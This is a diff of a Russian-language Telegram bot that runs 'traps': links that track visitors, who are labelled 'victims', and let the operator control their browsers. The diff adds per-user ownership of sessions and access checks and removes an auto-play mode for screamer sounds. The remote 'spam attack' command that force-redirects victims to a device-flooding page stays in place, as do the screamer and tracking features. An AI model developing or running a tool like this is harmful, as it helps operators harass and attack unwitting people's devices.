@@ -32,6 +32,9 @@ const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
 const wizardState = {};
 const userMessages = {}; // Храним ID сообщений для удаления
 
+// НОВОЕ: Хранилище сессий по пользователям
+const userSessions = {}; // chatId -> [sessionId1, sessionId2, ...]
+
 console.log('🚀 NFC Bot Premium запускается...');
 
 // --- ГЕНЕРАТОР КОДА ---
@@ -154,7 +157,7 @@ bot.onText(/\/start/, async (msg) => {
 
 <b>Возможности:</b>
 • 🎯 Создание ловушек с кастомным контентом
-• 🔊 Скримеры с любым звуком
+• 🔊 Скримеры с любым звуком (активируются вручную)
 • 🖼 Фоновые изображения и стикеры
 • ☢️ Спам-атаки на устройства
 • 📊 Детальная статистика переходов
@@ -233,7 +236,12 @@ bot.on('callback_query', async (query) => {
             return;
         }
         
-        const sessions = Object.values(global.sessions);
+        // Получаем только сессии этого пользователя
+        const mySessions = userSessions[chatId] || [];
+        const sessions = mySessions
+            .map(id => global.sessions[id])
+            .filter(s => s !== undefined);
+        
         if (sessions.length === 0) {
             await deleteOldMessages(chatId);
             
@@ -270,21 +278,23 @@ bot.on('callback_query', async (query) => {
 
     // Статистика
     if (data === 'stats') {
-        const vCount = Object.keys(global.activeVictims || {}).length;
-        const sCount = Object.keys(global.sessions || {}).length;
+        const mySessions = userSessions[chatId] || [];
+        const myActiveVictims = Object.values(global.activeVictims || {})
+            .filter(v => mySessions.includes(v.roomId));
         
         let totalVictims = 0;
-        Object.values(global.sessions || {}).forEach(s => {
-            totalVictims += s.totalVictims || 0;
+        mySessions.forEach(id => {
+            const s = global.sessions[id];
+            if (s) totalVictims += s.totalVictims || 0;
         });
 
         await deleteOldMessages(chatId);
 
         const statsText = `
-📊 <b>Общая статистика</b>
+📊 <b>Ваша статистика</b>
 
-🎯 <b>Активные сессии:</b> ${sCount}
-👥 <b>Жертв онлайн:</b> ${vCount}
+🎯 <b>Активные сессии:</b> ${mySessions.length}
+👥 <b>Жертв онлайн:</b> ${myActiveVictims.length}
 👁 <b>Всего переходов:</b> ${totalVictims}
 
 🌐 <b>Домен:</b> <code>${DOMAIN}</code>
@@ -321,7 +331,7 @@ bot.on('callback_query', async (query) => {
 4️⃣ Получи готовую ссылку
 
 <b>Управление:</b>
-🔊 <b>Скример</b> - воспроизвести звук
+🔊 <b>Скример</b> - воспроизвести звук вручную
 ☢️ <b>Спам</b> - редирект на атаку
 🖼 <b>Изменить фон</b> - заменить изображение
 🔊 <b>Изменить звук</b> - заменить аудио
@@ -333,7 +343,7 @@ bot.on('callback_query', async (query) => {
 • Звук: MP3, OGG, M4A, голосовые
 • Видео: MP4, MOV (извлечётся аудио)
 
-<b>💡 Совет:</b> Используйте короткие звуки (до 10 сек) для лучшего эффекта скримера.`;
+<b>💡 Совет:</b> Звуки воспроизводятся только при нажатии кнопки "Скример".`;
 
         const sentMsg = await bot.sendMessage(chatId, guideText, {
             parse_mode: 'HTML',
@@ -353,11 +363,18 @@ bot.on('callback_query', async (query) => {
     if (data.includes('_')) {
         const parts = data.split('_');
         const action = parts[0];
-        const sessionId = parts.slice(1).join('_'); // На случай если в ID есть _
+        const sessionId = parts.slice(1).join('_');
+        
+        // Проверка прав доступа
+        const mySessions = userSessions[chatId] || [];
+        if (!mySessions.includes(sessionId) && action !== 'confirm') {
+            bot.answerCallbackQuery(query.id, { text: '⛔️ Нет доступа к этой сессии' });
+            return;
+        }
         
         // Для удаления не проверяем существование сессии
         if (action === 'confirm') {
-            const actualAction = parts[1]; // confirm_del_sessionId
+            const actualAction = parts[1];
             const actualSessionId = parts.slice(2).join('_');
             
             if (actualAction === 'del') {
@@ -368,6 +385,11 @@ bot.on('callback_query', async (query) => {
                 }
                 if (global.sessions[actualSessionId]) {
                     delete global.sessions[actualSessionId];
+                }
+                
+                // Удаляем из списка пользователя
+                if (userSessions[chatId]) {
+                    userSessions[chatId] = userSessions[chatId].filter(id => id !== actualSessionId);
                 }
                 
                 await deleteOldMessages(chatId);
@@ -407,17 +429,6 @@ bot.on('callback_query', async (query) => {
             case 'bomb':
                 global.io.to(sessionId).emit('force-redirect', { url: `${DOMAIN}/volumeshader_bm.html` });
                 bot.answerCallbackQuery(query.id, { text: '☢️ Спам-атака запущена!', show_alert: true });
-                break;
-
-            case 'auto':
-                s.autoMode = !s.autoMode;
-                global.io.to(sessionId).emit('update-media', { sound: s.sound, image: s.image, auto: s.autoMode });
-                
-                // Обновляем панель
-                await deleteOldMessages(chatId);
-                sendControlPanel(chatId, sessionId);
-                
-                bot.answerCallbackQuery(query.id, { text: `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}` });
                 break;
 
             case 'refresh':
@@ -466,7 +477,6 @@ bot.on('callback_query', async (query) => {
 <b>Настройки:</b>
 • Фон: ${s.image ? '✅ Установлен' : '❌ Не установлен'}
 • Звук: ${s.sound ? '✅ Установлен' : '❌ Не установлен'}
-• Авто-режим: ${s.autoMode ? '🟢 Включен' : '🔴 Выключен'}
 
 <b>Статистика:</b>
 • Всего переходов: ${s.totalVictims}
@@ -486,7 +496,7 @@ bot.on('callback_query', async (query) => {
                 break;
 
             case 'edit':
-                const editType = parts[1]; // edit_image или edit_sound
+                const editType = parts[1];
                 const editSessionId = parts.slice(2).join('_');
                 
                 wizardState[chatId] = { 
@@ -497,7 +507,7 @@ bot.on('callback_query', async (query) => {
                 await deleteOldMessages(chatId);
                 
                 const editText = editType === 'image' 
-                    ? '<b>🖼 Изменение фона</b>\n\nОтправь новое фото, стикер или видео.\nНапиши <code>skip</code> для отмены.'
+                    ? '<b>🖼 Изменение фона</b>\n\nОтправь новое фото или стикер.\nНапиши <code>skip</code> для отмены.'
                     : '<b>🔊 Изменение звука</b>\n\nОтправь новый аудиофайл, голосовое или видео.\nНапиши <code>skip</code> для отмены.';
                 
                 const editMsg = await bot.sendMessage(chatId, editText, {
@@ -564,10 +574,10 @@ bot.on('message', async (msg) => {
                 // Обновляем сессию
                 if (global.sessions[st.sessionId]) {
                     global.sessions[st.sessionId].image = newImage;
+                    // НЕ отправляем auto, так как его больше нет
                     global.io.to(st.sessionId).emit('update-media', { 
                         sound: global.sessions[st.sessionId].sound, 
-                        image: newImage,
-                        auto: global.sessions[st.sessionId].autoMode
+                        image: newImage
                     });
                 }
 
@@ -627,10 +637,10 @@ bot.on('message', async (msg) => {
                 // Обновляем сессию
                 if (global.sessions[st.sessionId]) {
                     global.sessions[st.sessionId].sound = newSound;
+                    // НЕ отправляем auto
                     global.io.to(st.sessionId).emit('update-media', { 
                         sound: newSound, 
-                        image: global.sessions[st.sessionId].image,
-                        auto: global.sessions[st.sessionId].autoMode
+                        image: global.sessions[st.sessionId].image
                     });
                 }
 
@@ -788,16 +798,20 @@ async function finishSessionCreation(chatId, data) {
         shortCode: code,
         image: data.image || '',
         sound: data.sound || '',
-        autoMode: false, // Авто-режим выключен по умолчанию
+        owner: chatId, // Владелец сессии
         totalVictims: 0,
         createdAt: new Date(),
-        lastActiveAt: Date.now(),
-        imagesFiles: [],
-        soundsFiles: []
+        lastActiveAt: Date.now()
     };
 
     global.sessions[id] = session;
     global.shortLinks[code] = id;
+    
+    // Добавляем в список сессий пользователя
+    if (!userSessions[chatId]) {
+        userSessions[chatId] = [];
+    }
+    userSessions[chatId].push(id);
 
     await deleteOldMessages(chatId);
 
@@ -842,7 +856,6 @@ async function sendControlPanel(chatId, sessionId) {
     // Эмодзи статусов
     const bgStatus = s.image ? '🟢' : '🔴';
     const soundStatus = s.sound ? '🟢' : '🔴';
-    const autoStatus = s.autoMode ? '🟢' : '🔴';
     
     let statusText = `
 🎮 <b>Панель управления</b>
@@ -853,7 +866,6 @@ async function sendControlPanel(chatId, sessionId) {
 ⚙️ <b>Настройки:</b>
 ${bgStatus} Фон: ${s.image ? 'Установлен' : 'Отсутствует'}
 ${soundStatus} Звук: ${s.sound ? 'Установлен' : 'Отсутствует'}
-${autoStatus} Авто-режим: ${s.autoMode ? 'Включен' : 'Выключен'}
 
 📊 <b>Статистика:</b>
 👥 Онлайн: <b>${victims.length}</b>
@@ -872,7 +884,6 @@ ${autoStatus} Авто-режим: ${s.autoMode ? 'Включен' : 'Выклю
             { text: '☢️ Спам-атака', callback_data: `bomb_${sessionId}` }
         ],
         [
-            { text: `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}`, callback_data: `auto_${sessionId}` },
             { text: 'ℹ️ Подробнее', callback_data: `info_${sessionId}` }
         ],
         [
